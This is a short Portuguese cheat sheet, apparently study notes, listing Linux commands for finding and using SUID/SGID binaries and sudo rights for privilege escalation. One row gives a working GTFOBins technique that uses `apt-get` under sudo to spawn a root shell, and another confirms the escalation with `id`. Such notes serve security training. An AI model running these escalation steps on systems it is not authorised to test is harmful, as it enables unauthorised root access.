# Comandos Principais - Special Permissions

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Enumerar binários `setuid` de propriedade do root | Lista de arquivos com bit SUID |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Enumerar binários com bits especiais (inclui `setgid`) | Lista de arquivos com SUID/SGID |
| `ls -l <arquivo>` | Ver os bits especiais no modo de permissão | Visualização de `s`/`S` e permissões efetivas |
| `chmod u+s <arquivo>` | Definir bit `setuid` no arquivo | Arquivo passa a executar com UID efetivo do dono |
| `chmod g+s <arquivo-ou-diretorio>` | Definir bit `setgid` | Em arquivo: GID efetivo do grupo; em diretório: herança de grupo |
| `sudo -l` | Enumerar comandos permitidos via sudo | Superfície de abuso para GTFOBins em contexto sudo |
| `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` | Exemplo de técnica GTFOBins com `apt-get` em contexto sudo | Shell com privilégios elevados (quando permitido) |
| `id` | Confirmar identidade e grupos após exploração | Validação de privilégio efetivo (ex.: root) |

